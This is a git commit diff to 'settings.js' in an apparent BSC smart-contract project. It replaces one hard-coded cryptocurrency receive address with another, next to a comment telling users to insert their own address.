e9699ea806786db4901f30cc7971c7c49d31640d
ms010821ma-svg <ms010821ma@gmail.com>
2025-09-28 00:56:51 +0200

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0xCf71bcB9c7B1126FcC70e9C19Fb883505bA5d395";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0xb909b9f582c5628bb84449ca80baeb1b44bf4d57";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
